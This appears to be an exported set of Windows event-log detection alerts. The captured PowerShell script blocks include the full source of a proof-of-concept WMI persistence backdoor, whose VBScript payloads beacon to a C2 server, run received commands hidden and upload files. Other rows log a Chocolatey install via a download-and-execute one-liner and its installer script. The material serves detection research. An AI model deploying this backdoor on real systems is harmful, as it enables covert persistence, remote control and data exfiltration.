'WMI.BackdoorAction') return $Action } Function Register-WMIBackdoor { Param ( [Parameter(Mandatory = $True)] [ValidateScript({$_.PSObject.TypeNames[0].StartsWith('WMI.BackdoorTrigger')})] [Hashtable] $Trigger, [Parameter(Mandatory = $True)] [ValidateScript({$_.PSObject.TypeNames[0] -eq 'WMI.BackdoorAction'})] [Hashtable] $Action, [String] [ValidateNotNullOrEmpty()] [Alias('Cn')] $ComputerName = '.', [Management.Automation.PSCredential] $Credential ) $TypeComponents = $Trigger.PSObject.TypeNames[0].Split('.') # Register the timer components if a time-based trigger was selected switch ($TypeComponents[2]) { 'TimingInterval' { $TimerName = $TypeComponents[3] $TimingInterval = $TypeComponents[4] $TimerArg = @{ IntervalBetweenEvents = ([UInt32] $TimingInterval) SkipIfPassed = $False TimerId = $TimerName } $Arguments = @{ Namespace = 'ROOT\cimv2' Class = '__IntervalTimerInstruction' ComputerName = $ComputerName Arguments = $TimerArg ErrorAction = 'Stop' } if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $PSBoundParameters['Credential'] } $Timer = Set-WmiInstance @Arguments } 'DateTime' { $TimerName = $TypeComponents[3] $DateTime = $TypeComponents[3].Replace('_', '.') $TimerArg = @{ EventDateTime = $DateTime SkipIfPassed = $False TimerId = $TimerName } $Arguments = @{ Namespace = 'ROOT\cimv2' Class = '__AbsoluteTimerInstruction' ComputerName = $ComputerName Arguments = $TimerArg ErrorAction = 'Stop' } if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $PSBoundParameters['Credential'] } $Timer = Set-WmiInstance @Arguments } } $FilterParams = @{ Namespace = 'root\subscription' Class = '__EventFilter' ComputerName = $ComputerName Arguments = $Trigger ErrorAction = 'Stop' } if ($PSBoundParameters['Credential']) { $FilterParams['Credential'] = $PSBoundParameters['Credential'] } $Filter = Set-WmiInstance @FilterParams $ConsumerParams = @{ Namespace = 'root\subscription' Class = 'ActiveScriptEventConsumer' ComputerName = $ComputerName Arguments = $Action ErrorAction = 'Stop' } if ($PSBoundParameters['Credential']) { $ConsumerParams['Credential'] = $PSBoundParameters['Credential'] } $Consumer = Set-WmiInstance @ConsumerParams $BindingParams = @{ Namespace = 'root\subscription' Class = '__FilterToConsumerBinding' ComputerName = $ComputerName Arguments = @{ Filter = $Filter; Consumer = $Consumer } ErrorAction = 'Stop' } if ($PSBoundParameters['Credential']) { $BindingParams['Credential'] = $PSBoundParameters['Credential'] } $FilterConsumerBinding = Set-WmiInstance @BindingParams $Result = New-Object PSObject -Property @{ Filter = $Filter Consumer = $Consumer Binding = $FilterConsumerBinding } $Result.PSObject.TypeNames.Insert(0, 'WMI.BackdoorRegistration') return $Result }","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: C:\TMP\WMIBackdoor.ps1 ¦ ScriptBlockId: fb2f6352-56e2-466c-92d0-11450df4b1d5 ¦ ScriptBlockText: <# PoC WMI backdoor. This is a crude WMI backdoor (that doesn't include a C2 server component) used for demonstration purposes only and to demonstrate offensive WMI techniques. No further weaponization will be performed. I will not respond to issues or pull requests. Author: Matthew Graeber (@mattifestation) License: BSD 3-Clause #> Function New-WMIBackdoorTrigger { Param ( [Parameter(Mandatory = $True, ParameterSetName = 'Interval')] [UInt32] $TimingInterval, [Parameter(Mandatory = $True, ParameterSetName = 'AbsoluteDatetime')] [DateTime] $Datetime, [Parameter(ParameterSetName = 'Interval')] [Parameter(ParameterSetName = 'AbsoluteDatetime')] [ValidateNotNullOrEmpty()] [String] $TimerName = 'Timer', [Parameter(Mandatory = $True, ParameterSetName = 'ProcessStart')] [ValidateNotNullOrEmpty()] [String] $ProcessName, [Parameter(Mandatory = $True, ParameterSetName = 'NewOrModifiedFile')] [ValidateScript({ foreach ($Ext in $_) {(!$Ext.Contains('.')) -and ($Ext.Length)} })] [String[]] $NewOrModifiedFileExtensions, [Parameter(Mandatory = $True, ParameterSetName = 'LockedScreen')] [Switch] $LockedScreen, [Parameter(Mandatory = $True, ParameterSetName = 'InteractiveLogon')] [Switch] $InteractiveLogon, [Parameter(Mandatory = $True, ParameterSetName = 'DriveInsertion')] [Switch] $DriveInsertion, [ValidateNotNullOrEmpty()] [String] $TriggerName ) switch ($PsCmdlet.ParameterSetName) { 'Interval' { if ($TriggerName) { $Name = $TriggerName } else { $Name = 'TimingIntervalTrigger' } # Convert minutes to milliseconds $IntervalMS = $TimingInterval * 60000 $Result = @{ Name = $Name EventNameSpace = 'ROOT\cimv2' QueryLanguage = 'WQL' Query = ""SELECT * FROM __TimerEvent WHERE TimerID = '$TimerName'"" } # Use $TimerName and $IntervalMS as out of band information to be used by Register-WMIBackdoor # This is kind of ugly but I wanted to maintain strict function separation for event triggers, # payloads, and registration. $Result.PSObject.TypeNames.Insert(0, ""WMI.BackdoorTrigger.TimingInterval.$TimerName.$IntervalMS"") return $Result } 'AbsoluteDatetime' { if ($TriggerName) { $Name = $TriggerName } else { $Name = 'DatetimeTrigger' } $DMTFTime = [Management.ManagementDateTimeConverter]::ToDmtfDateTime($Datetime).Replace('.','_') $Result = @{ Name = $Name EventNameSpace = 'ROOT\cimv2' QueryLanguage = 'WQL' Query = ""SELECT * FROM __TimerEvent WHERE TimerID = '$TimerName'"" } $Result.PSObject.TypeNames.Insert(0, ""WMI.BackdoorTrigger.DateTime.$TimerName.$DMTFTime"") return $Result } 'ProcessStart' { if ($TriggerName) { $Name = $TriggerName } else { $Name = 'ProcessStartTrigger' } $Result = @{ Name = $Name EventNameSpace = 'ROOT\cimv2' QueryLanguage = 'WQL' Query = ""SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = '$ProcessName'"" } $Result.PSObject.TypeNames.Insert(0, ""WMI.BackdoorTrigger.ProcessStart"") return $Result } 'LockedScreen' { if ($TriggerName) { $Name = $TriggerName } else { $Name = 'LockedScreenTrigger' } $Result = @{ Name = $Name EventNameSpace = 'ROOT\cimv2' QueryLanguage = 'WQL' Query = 'SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = ""LogonUI.exe""' } $Result.PSObject.TypeNames.Insert(0, ""WMI.BackdoorTrigger.LockedScreen"") return $Result } 'InteractiveLogon' { if ($TriggerName) { $Name = $TriggerName } else { $Name = 'InteractiveLogonTrigger' } $Result = @{ Name = $Name EventNameSpace = 'ROOT\subscription' QueryLanguage = 'WQL' Query = ""SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession' AND TargetInstance.LogonType = 2"" } $Result.PSObject.TypeNames.Insert(0, ""WMI.BackdoorTrigger.InteractiveLogon"") return $Result } 'DriveInsertion' { if ($TriggerName) { $Name = $TriggerName } else { $Name = 'DriveInsertionTrigger' } $Result = @{ Name = $Name EventNameSpace = 'ROOT\cimv2' QueryLanguage = 'WQL' Query = 'SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2' } $Result.PSObject.TypeNames.Insert(0, ""WMI.BackdoorTrigger.DriveInsertion"") return $Result } 'NewOrModifiedFile' { if ($TriggerName) { $Name = $TriggerName } else { $Name = 'NewOrModifiedFileTrigger' } $QueryExtensions = ($NewOrModifiedFileExtensions | % { ""TargetInstance.Extension = `""$_`"""" }) -join ' OR ' $Result = @{ Name = $Name EventNameSpace = 'ROOT\cimv2' QueryLanguage = 'WQL' Query = ""SELECT * FROM __InstanceOperationEvent WITHIN 30 WHERE ((__CLASS = `""__InstanceCreationEvent`"" OR __CLASS = `""__InstanceModificationEvent`"") AND TargetInstance ISA `""CIM_DataFile`"") AND ($QueryExtensions)"" } $Result.PSObject.TypeNames.Insert(0, ""WMI.BackdoorTrigger.NewOrModifiedFile"") return $Result } } } Function New-WMIBackdoorAction { Param ( [Parameter(Mandatory = $True, ParameterSetName = 'Backdoor')] [Parameter(Mandatory = $True, ParameterSetName = 'FileUpload')] [Uri] $C2Uri, [Parameter(Mandatory = $True, ParameterSetName = 'Backdoor')] [Switch] $Backdoor, [Parameter(Mandatory = $True, ParameterSetName = 'KillProcess')] [Switch] $KillProcess, [Parameter(Mandatory = $True, ParameterSetName = 'InfectDrive')] [Switch] $InfectDrive, [Parameter(Mandatory = $True, ParameterSetName = 'FileUpload')] [Switch] $FileUpload, [ValidateNotNullOrEmpty()] [String] $ActionName ) $Base64Decoder = @' ' Decodes a base-64 encoded string (BSTR type). ' 1999 - 2004 Antonin Foller, http://www.motobit.com ' 1.01 - solves problem with Access And 'Compare Database' (InStr) Function Base64Decode(ByVal base64String) 'rfc1521 '1999 Antonin Foller, Motobit Software, http://Motobit.cz Const Base64 = ""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"" Dim dataLength, sOut, groupBegin 'remove white spaces, If any base64String = Replace(base64String, vbCrLf, """") base64String = Replace(base64String, vbTab, """") base64String = Replace(base64String, "" "", """") 'The source must consists from groups with Len of 4 chars dataLength = Len(base64String) If dataLength Mod 4 <> 0 Then Err.Raise 1, ""Base64Decode"", ""Bad Base64 string."" Exit Function End If ' Now decode each group: For groupBegin = 1 To dataLength Step 4 Dim numDataBytes, CharCounter, thisChar, thisData, nGroup, pOut ' Each data group encodes up To 3 actual bytes. numDataBytes = 3 nGroup = 0 For CharCounter = 0 To 3 ' Convert each character into 6 bits of data, And add it To ' an integer For temporary storage. If a character is a '=', there ' is one fewer data byte. (There can only be a maximum of 2 '=' In ' the whole string.) thisChar = Mid(base64String, groupBegin + CharCounter, 1) If thisChar = ""="" Then numDataBytes = numDataBytes - 1 thisData = 0 Else thisData = InStr(1, Base64, thisChar, vbBinaryCompare) - 1 End If If thisData = -1 Then Err.Raise 2, ""Base64Decode"", ""Bad character In Base64 string."" Exit Function End If nGroup = 64 * nGroup + thisData Next 'Hex splits the long To 6 groups with 4 bits nGroup = Hex(nGroup) 'Add leading zeros nGroup = String(6 - Len(nGroup), ""0"") & nGroup 'Convert the 3 byte hex integer (6 chars) To 3 characters pOut = Chr(CByte(""&H"" & Mid(nGroup, 1, 2))) + _ Chr(CByte(""&H"" & Mid(nGroup, 3, 2))) + _ Chr(CByte(""&H"" & Mid(nGroup, 5, 2))) 'add numDataBytes characters To out string sOut = sOut & Left(pOut, numDataBytes) Next Base64Decode = sOut End Function '@ switch ($PsCmdlet.ParameterSetName) { 'Backdoor' { $VBScript = @"" Option Explicit On Error Resume Next Dim oXMLHTTP, oReg, aC2URL, aCmdType, aClassName, aPropertyName, aPayload, aMachineGuid Set oReg = GetObject(""winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv"") oReg.GetStringValue &H80000002, ""SOFTWARE\Microsoft\Cryptography"", ""MachineGuid"", aMachineGuid aC2URL = ""$($C2Uri.AbsoluteUri)index.html&ID="" & aMachineGuid Sub StorePayloadInWMIRepo(classname, propertyname, payload) Dim oLocation, oServices, oDataObject Set oLocation = CreateObject(""WbemScripting.SWbemLocator"") Set oServices = oLocation.ConnectServer(, ""root\cimv2"") Set oDataObject = oServices.Get oDataObject.Path_.Class = classname oDataObject.Properties_.Add(propertyname, 8).Value = payload oDataObject.Put_ End Sub Sub DeleteWMIClass(classname, propertyname) Dim oLocation, oServices, oDataObject Set oLocation = CreateObject(""WbemScripting.SWbemLocator"") Set oServices = oLocation.ConnectServer(, ""root\cimv2"") Set oDataObject = oServices.Get oDataObject.Path_.Class = classname oDataObject.Properties_.Add(propertyname, 8).Value = """" oDataObject.Delete_() End Sub Sub ExecCommand(command) Dim oLocation, oServices, oProcess, oStartup, oConfig, oResult, iProcessID Const HIDDEN_WINDOW = 12 Set oLocation = CreateObject(""WbemScripting.SWbemLocator"") Set oServices = oLocation.ConnectServer(, ""root\cimv2"") Set oStartup = oServices.Get(""Win32_ProcessStartup"") Set oConfig = oStartup.SpawnInstance_ oConfig.ShowWindow = HIDDEN_WINDOW Set oProcess = GetObject(""winmgmts:root\cimv2:Win32_Process"") oResult = oProcess.Create(command, null, oConfig, iProcessID) End Sub $Base64Decoder Set oXMLHTTP = CreateObject(""MSXML2.XMLHTTP"") oXMLHTTP.open ""GET"", aC2URL, False oXMLHTTP.send() If oXMLHTTP.Status = 200 Then aCmdType = oXMLHTTP.getResponseHeader(""Type"") aClassName = oXMLHTTP.getResponseHeader(""Class"") aPropertyName = oXMLHTTP.getResponseHeader(""Property"") aPayload = Base64Decode(oXMLHTTP.responseText) Select Case aCmdType Case ""V"" If Not IsNull(aPayload) Then Execute aPayload End If Case ""P"" If Not IsNull(aClassName) And Not IsNull(aPropertyName) And Not IsNull(aPayload) Then Call StorePayloadInWMIRepo(aClassName, aPropertyName, aPayload) End If Case ""D"" If Not IsNull(aClassName) And Not IsNull(aPropertyName) Then Call DeleteWMIClass(aClassName, aPropertyName) End If Case ""C"" If Not IsNull(aPayload) Then Call ExecCommand(aPayload) End If End Select End If ""@ if ($ActionName) { $Name = $ActionName } else { $Name = 'LaunchBeaconingBackdoor' } } 'KillProcess' { $VBScript = @"" Dim oLocation, oServices, oProcessList, oProcess Set oLocation = CreateObject(""WbemScripting.SWbemLocator"") Set oServices = oLocation.ConnectServer(, ""root\cimv2"") Set oProcessList = oServices.ExecQuery(""SELECT * FROM Win32_Process WHERE ProcessID = "" & TargetEvent.ProcessID) For Each oProcess in oProcessList oProcess.Terminate() Next ""@ if ($ActionName) { $Name = $ActionName } else { $Name = 'KillProcess' } } 'InfectDrive' { # This is only a PoC at this stage. This payload simply drops # the EICAR signature to <INSERTED_DRIVE_LETTER>:\eicar.txt $VBScript = @"" Dim oFSO, oFile, sFilePath, sDecodedEicar $Base64Decoder sDecodedEicar = Base64Decode(""WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo="") Set oFSO = CreateObject(""Scripting.FileSystemObject"") sFilePath = TargetEvent.DriveName & ""\eicar.txt"" Set oFile = oFSO.CreateTextFile(sFilePath, True) oFile.Write sDecodedEicar oFile.Close ""@ if ($ActionName) { $Name = $ActionName } else { $Name = 'DriveInfector' } } 'FileUpload' { $VBScript = @"" On Error Resume Next Dim oReg, oXMLHTTP, oStream, aMachineGuid, aC2URL, vBinary Set oReg = GetObject(""winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv"") oReg.GetStringValue &H80000002, ""SOFTWARE\Microsoft\Cryptography"", ""MachineGuid"", aMachineGuid aC2URL = ""$($C2Uri.AbsoluteUri)index.html&ID="" & aMachineGuid Set oStream = CreateObject(""ADODB.Stream"") oStream.Type = 1 oStream.Open oStream.LoadFromFile TargetEvent.TargetInstance.Name vBinary = oStream.Read Set oXMLHTTP = CreateObject(""MSXML2.XMLHTTP"") oXMLHTTP.open ""POST"", aC2URL, False oXMLHTTP.setRequestHeader ""Path"", TargetEvent.TargetInstance.Name oXMLHTTP.send(vBinary) ""@ if ($ActionName) { $Name = $ActionName } else { $Name = 'FileUpload' } } } $Action = @{ Name = $Name ScriptingEngine = 'VBScript' ScriptText = $VBScript KillTimeout = [UInt32] 45 } $Action.PSObject.TypeNames.Insert(0, 'WMI.BackdoorAction') return $Action } Function Register-WMIBackdoor { Param ( [Parameter(Mandatory = $True)] [ValidateScript({$_.PSObject.TypeNames[0].StartsWith('WMI.BackdoorTrigger')})] [Hashtable] $Trigger, [Parameter(Mandatory = $True)] [ValidateScript({$_.PSObject.TypeNames[0] -eq 'WMI.BackdoorAction'})] [Hashtable] $Action, [String] [ValidateNotNullOrEmpty()] [Alias('Cn')] $ComputerName = '.', [Management.Automation.PSCredential] $Credential ) $TypeComponents = $Trigger.PSObject.TypeNames[0].Split('.') # Register the timer components if a time-based trigger was selected switch ($TypeComponents[2]) { 'TimingInterval' { $TimerName = $TypeComponents[3] $TimingInterval = $TypeComponents[4] $TimerArg = @{ IntervalBetweenEvents = ([UInt32] $TimingInterval) SkipIfPassed = $False TimerId = $TimerName } $Arguments = @{ Namespace = 'ROOT\cimv2' Class = '__IntervalTimerInstruction' ComputerName = $ComputerName Arguments = $TimerArg ErrorAction = 'Stop' } if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $PSBoundParameters['Credential'] } $Timer = Set-WmiInstance @Arguments } 'DateTime' { $TimerName = $TypeComponents[3] $DateTime = $TypeComponents[3].Replace('_', '.') $TimerArg = @{ EventDateTime = $DateTime SkipIfPassed = $False TimerId = $TimerName } $Arguments = @{ Namespace = 'ROOT\cimv2' Class = '__AbsoluteTimerInstruction' ComputerName = $ComputerName Arguments = $TimerArg ErrorAction = 'Stop' } if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $PSBoundParameters['Credential'] } $Timer = Set-WmiInstance @Arguments } } $FilterParams = @{ Namespace = 'root\subscription' Class = '__EventFilter' ComputerName = $ComputerName Arguments = $Trigger ErrorAction = 'Stop' } if ($PSBoundParameters['Credential']) { $FilterParams['Credential'] = $PSBoundParameters['Credential'] } $Filter = Set-WmiInstance @FilterParams $ConsumerParams = @{ Namespace = 'root\subscription' Class = 'ActiveScriptEventConsumer' ComputerName = $ComputerName Arguments = $Action ErrorAction = 'Stop' } if ($PSBoundParameters['Credential']) { $ConsumerParams['Credential'] = $PSBoundParameters['Credential'] } $Consumer = Set-WmiInstance @ConsumerParams $BindingParams = @{ Namespace = 'root\subscription' Class = '__FilterToConsumerBinding' ComputerName = $ComputerName Arguments = @{ Filter = $Filter; Consumer = $Consumer } ErrorAction = 'Stop' } if ($PSBoundParameters['Credential']) { $BindingParams['Credential'] = $PSBoundParameters['Credential'] } $FilterConsumerBinding = Set-WmiInstance @BindingParams $Result = New-Object PSObject -Property @{ Filter = $Filter Consumer = $Consumer Binding = $FilterConsumerBinding } $Result.PSObject.TypeNames.Insert(0, 'WMI.BackdoorRegistration') return $Result }","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:34.056 +01:00","Suspicious PowerShell Invocations - Specific - PowerShell Module","high","MSEDGEWIN10","PwSh",4103,68,"Payload: CommandInvocation(Add-Type): ""Add-Type"" ParameterBinding(Add-Type): name=""Namespace""; value=""Win32"" ParameterBinding(Add-Type): name=""Name""; value=""NativeMethods"" ParameterBinding(Add-Type): name=""MemberDefinition""; value=""[DllImport(""user32.dll"", SetLastError = true, CharSet = CharSet.Auto)] public static extern IntPtr SendMessageTimeout( IntPtr hWnd, uint Msg, UIntPtr wParam, string lParam, uint fuFlags, uint uTimeout, out UIntPtr lpdwResult);""","ContextInfo: Severity = Informational Host Name = ConsoleHost Host Version = 5.1.17763.316 Host ID = 38d62719-3f61-40fc-8919-7504c91727fd Host Application = powershell -NoProfile -ExecutionPolicy unrestricted -Command iex ((new-object net.webclient).DownloadString('https://chocolatey.org/install.ps1')) Engine Version = 5.1.17763.316 Runspace ID = 35abb463-f138-49ae-a2c4-4dde53bd0e48 Pipeline ID = 1 Command Name = Add-Type Command Type = Cmdlet Script Name = C:\Users\IEUser\AppData\Local\Temp\chocolatey\chocInstall\tools\chocolateyInstall\helpers\functions\Set-EnvironmentVariable.ps1 Command Path = Sequence Number = 16 User = MSEDGEWIN10\IEUser Connected User = Shell ID = Microsoft.PowerShell ¦ Payload: CommandInvocation(Add-Type): ""Add-Type"" ParameterBinding(Add-Type): name=""Namespace""; value=""Win32"" ParameterBinding(Add-Type): name=""Name""; value=""NativeMethods"" ParameterBinding(Add-Type): name=""MemberDefinition""; value=""[DllImport(""user32.dll"", SetLastError = true, CharSet = CharSet.Auto)] public static extern IntPtr SendMessageTimeout( IntPtr hWnd, uint Msg, UIntPtr wParam, string lParam, uint fuFlags, uint uTimeout, out UIntPtr lpdwResult);"" ¦ UserData:","da4a803e-e609-d187-675c-d7e7f0083763"
"2019-03-19 14:21:31.332 +01:00","Automated Collection Command PowerShell","med","MSEDGEWIN10","PwSh",4104,54,"ScriptBlock: )?', '', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase) if ($updatedPath -ne $path) { Write-Output ""Updating `'$_`' PATH to reflect removal of '$chocolateyPathOld'."" try { Set-EnvironmentVariable -Name 'Path' -Value $updatedPath -Scope $_ -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to remove the old environment variable from PATH. You will need to do this manually"" } } } Copy-Item ""$chocolateyPathOld\lib\*"" ""$chocolateyPath\lib"" -force -recurse $from = ""$chocolateyPathOld\bin"" $to = ""$chocolateyPath\bin"" $exclude = @(""choco.exe"", ""chocolatey.exe"", ""cinst.exe"", ""clist.exe"", ""cpack.exe"", ""cpush.exe"", ""cuninst.exe"", ""cup.exe"", ""cver.exe"", ""RefreshEnv.cmd"") Get-ChildItem -Path $from -recurse -Exclude $exclude | % { Write-Debug ""Copying $_ `n to $to"" if ($_.PSIsContainer) { Copy-Item $_ -Destination (Join-Path $to $_.Parent.FullName.Substring($from.length)) -Force -ErrorAction SilentlyContinue } else { $fileToMove = (Join-Path $to $_.FullName.Substring($from.length)) try { Copy-Item $_ -Destination $fileToMove -Exclude $exclude -Force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to move `'$fileToMove`'. You may need to reinstall the shim"" } } } } } function Remove-OldChocolateyInstall { param( [string]$chocolateyPathOld = ""$sysDrive\Chocolatey"" ) Write-Debug ""Remove-OldChocolateyInstall"" if (Test-Path $chocolateyPathOld) { Write-ChocolateyWarning ""This action will result in Log Errors, you can safely ignore those. `n You may need to finish removing '$chocolateyPathOld' manually."" try { Get-ChildItem -Path ""$chocolateyPathOld"" | % { if (Test-Path $_.FullName) { Write-Debug ""Removing $_ unless matches .log"" Remove-Item $_.FullName -exclude *.log -recurse -force -ErrorAction SilentlyContinue } } Write-Output ""Attempting to remove `'$chocolateyPathOld`'. This may fail if something in the folder is being used or locked."" Remove-Item ""$($chocolateyPathOld)"" -force -recurse -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to remove `'$chocolateyPathOld`'. You will need to manually remove it."" } } } function Install-ChocolateyFiles { param( [string]$chocolateyPath ) Write-Debug ""Install-ChocolateyFiles"" Write-Debug ""Removing install files in chocolateyInstall, helpers, redirects, and tools"" ""$chocolateyPath\chocolateyInstall"", ""$chocolateyPath\helpers"", ""$chocolateyPath\redirects"", ""$chocolateyPath\tools"" | % { #Write-Debug ""Checking path $_"" if (Test-Path $_) { Get-ChildItem -Path ""$_"" | % { #Write-Debug ""Checking child path $_ ($($_.FullName))"" if (Test-Path $_.FullName) { Write-Debug ""Removing $_ unless matches .log"" Remove-Item $_.FullName -exclude *.log -recurse -force -ErrorAction SilentlyContinue } } } } Write-Debug ""Attempting to move choco.exe to choco.exe.old so we can place the new version here."" # rename the currently running process / it will be locked if it exists $chocoExe = Join-Path $chocolateyPath 'choco.exe' if (Test-Path ($chocoExe)) { Write-Debug ""Renaming '$chocoExe' to '$chocoExe.old'"" try { Remove-Item ""$chocoExe.old"" -force -ErrorAction SilentlyContinue Move-Item $chocoExe ""$chocoExe.old"" -force -ErrorAction SilentlyContinue } catch { Write-ChocolateyWarning ""Was not able to rename `'$chocoExe`' to `'$chocoExe.old`'."" } } # remove pdb file if it is found $chocoPdb = Join-Path $chocolateyPath 'choco.pdb' if (Test-Path ($chocoPdb)) { Remove-Item ""$chocoPdb"" -Force -ErrorAction SilentlyContinue } Write-Debug ""Unpacking files required for Chocolatey."" $chocInstallFolder = Join-Path $thisScriptFolder ""chocolateyInstall"" $chocoExe = Join-Path $chocInstallFolder 'choco.exe' $chocoExeDest = Join-Path $chocolateyPath 'choco.exe' Copy-Item $chocoExe $chocoExeDest -force Write-Debug ""Copying the contents of `'$chocInstallFolder`' to `'$chocolateyPath`'."" Copy-Item $chocInstallFolder\* $chocolateyPath -Recurse -Force } function Ensure-ChocolateyLibFiles { param( [string]$chocolateyLibPath ) Write-Debug ""Ensure-ChocolateyLibFiles"" $chocoPkgDirectory = Join-Path $chocolateyLibPath 'chocolatey' Create-DirectoryIfNotExists $chocoPkgDirectory if (!(Test-Path(""$chocoPkgDirectory\chocolatey.nupkg""))) { Write-Output ""chocolatey.nupkg file not installed in lib.`n Attempting to locate it from bootstrapper."" $chocoZipFile = Join-Path $tempDir ""chocolatey\chocInstall\chocolatey.zip"" Write-Debug ""First the zip file at '$chocoZipFile'."" Write-Debug ""Then from a neighboring chocolatey.*nupkg file '$thisScriptFolder/../../'."" if (Test-Path(""$chocoZipFile"")) { Write-Debug ""Copying '$chocoZipFile' to '$chocoPkgDirectory\chocolatey.nupkg'."" Copy-Item ""$chocoZipFile"" ""$chocoPkgDirectory\chocolatey.nupkg"" -Force -ErrorAction SilentlyContinue } if (!(Test-Path(""$chocoPkgDirectory\chocolatey.nupkg""))) { $chocoPkg = Get-ChildItem ""$thisScriptFolder/../../"" | ?{$_.name -match ""^chocolatey.*nupkg"" } | Sort name -Descending | Select -First 1 if ($chocoPkg -ne '') { $chocoPkg = $chocoPkg.FullName } ""$chocoZipFile"", ""$chocoPkg"" | % { if ($_ -ne $null -and $_ -ne '') { if (Test-Path $_) { Write-Debug ""Copying '$_' to '$chocoPkgDirectory\chocolatey.nupkg'."" Copy-Item $_ ""$chocoPkgDirectory\chocolatey.nupkg"" -Force -ErrorAction SilentlyContinue } } } } } } function Install-ChocolateyBinFiles { param( [string] $chocolateyPath, [string] $chocolateyExePath ) Write-Debug ""Install-ChocolateyBinFiles"" Write-Debug ""Installing the bin file redirects"" $redirectsPath = Join-Path $chocolateyPath 'redirects' if (!(Test-Path ""$redirectsPath"")) { Write-ChocolateyWarning ""$redirectsPath does not exist"" return } $exeFiles = Get-ChildItem ""$redirectsPath"" -include @(""*.exe"",""*.cmd"") -recurse foreach ($exeFile in $exeFiles) { $exeFilePath = $exeFile.FullName $exeFileName = [System.IO.Path]::GetFileName(""$exeFilePath"") $binFilePath = Join-Path $chocolateyExePath $exeFileName $binFilePathRename = $binFilePath + '.old' $batchFilePath = $binFilePath.Replace("".exe"","".bat"") $bashFilePath = $binFilePath.Replace("".exe"","""") if (Test-Path ($batchFilePath)) { Remove-Item $batchFilePath -force -ErrorAction SilentlyContinue } if (Test-Path ($bashFilePath)) { Remove-Item $bashFilePath -force -ErrorAction SilentlyContinue } if (Test-Path ($binFilePathRename)) { try { Write-Debug ""Attempting to remove $binFilePathRename"" Remove-Item $binFilePathRename -force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to remove `'$binFilePathRename`'. This may cause errors."" } } if (Test-Path ($binFilePath)) { try { Write-Debug ""Attempting to rename $binFilePath to $binFilePathRename"" Move-Item -path $binFilePath -destination $binFilePathRename -force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to rename `'$binFilePath`' to `'$binFilePathRename`'."" } } try { Write-Debug ""Attempting to copy $exeFilePath to $binFilePath"" Copy-Item -path $exeFilePath -destination $binFilePath -force -ErrorAction Stop } catch { Write-ChocolateyWarning ""Was not able to replace `'$binFilePath`' with `'$exeFilePath`'. You may need to do this manually."" } $commandShortcut = [System.IO.Path]::GetFileNameWithoutExtension(""$exeFilePath"") Write-Debug ""Added command $commandShortcut"" } } function Initialize-ChocolateyPath { param( [string]$chocolateyExePath = ""$($env:ALLUSERSPROFILE)\chocolatey\bin"", [string]$chocolateyExePathVariable = ""%$($chocInstallVariableName)%\bin"" ) Write-Debug ""Initialize-ChocolateyPath"" Write-Debug ""Initializing Chocolatey Path if required"" $environmentTarget = [System.EnvironmentVariableTarget]::User if (Test-ProcessAdminRights) { Write-Debug ""Administrator installing so using Machine environment variable target instead of User."" $environmentTarget = [System.EnvironmentVariableTarget]::Machine } else { Write-ChocolateyWarning ""Setting ChocolateyInstall Path on USER PATH and not SYSTEM Path.`n This is due to either non-administrator install OR the process you are running is not being run as an Administrator."" } Install-ChocolateyPath -pathToInstall ""$chocolateyExePath"" -pathType $environmentTarget } function Process-ChocolateyBinFiles { param( [string]$chocolateyExePath = ""$($env:ALLUSERSPROFILE)\chocolatey\bin"", [string]$chocolateyExePathVariable = ""%$($chocInstallVariableName)%\bin"" ) Write-Debug ""Process-ChocolateyBinFiles"" $processedMarkerFile = Join-Path $chocolateyExePath '_processed.txt' if (!(test-path $processedMarkerFile)) { $files = get-childitem $chocolateyExePath -include *.bat -recurse if ($files -ne $null -and $files.Count -gt 0) { Write-Debug ""Processing Bin files"" foreach ($file in $files) { Write-Output ""Processing $($file.Name) to make it portable"" $fileStream = [System.IO.File]::Open(""$file"", 'Open', 'Read', 'ReadWrite') $reader = New-Object System.IO.StreamReader($fileStream) $fileText = $reader.ReadToEnd() $reader.Close() $fileStream.Close() $fileText = $fileText.ToLower().Replace(""`"""" + $chocolateyPath.ToLower(), ""SET DIR=%~dp0%`n""""%DIR%..\"").Replace(""\\"",""\"") Set-Content $file -Value $fileText -Encoding Ascii } } Set-Content $processedMarkerFile -Value ""$([System.DateTime]::Now.Date)"" -Encoding Ascii } } # Adapted from http://www.west-wind.com/Weblog/posts/197245.aspx function Get-FileEncoding($Path) { $bytes = [byte[]](Get-Content $Path -Encoding byte -ReadCount 4 -TotalCount 4) if(!$bytes) { return 'utf8' } switch -regex ('{0:x2}{1:x2}{2:x2}{3:x2}' -f $bytes[0],$bytes[1],$bytes[2],$bytes[3]) { '^efbbbf' { return 'utf8' } '^2b2f76' { return 'utf7' } '^fffe' { return 'unicode' } '^feff' { return 'bigendianunicode' } '^0000feff' { return 'utf32' } default { return 'ascii' } } } function Add-ChocolateyProfile { Write-Debug ""Add-ChocolateyProfile"" try { $profileFile = ""$profile"" if ($profileFile -eq $null -or $profileFile -eq '') { Write-Output 'Not setting tab completion: Profile variable ($profile) resulted in an empty string.' return } $profileDirectory = (Split-Path -Parent $profileFile) if ($env:ChocolateyNoProfile -ne $null -and $env:ChocolateyNoProfile -ne '') { Write-Warning ""Not setting tab completion: Environment variable ""ChocolateyNoProfile"" exists and is set."" return } $localSystem = Get-LocalizedWellKnownPrincipalName -WellKnownSidType 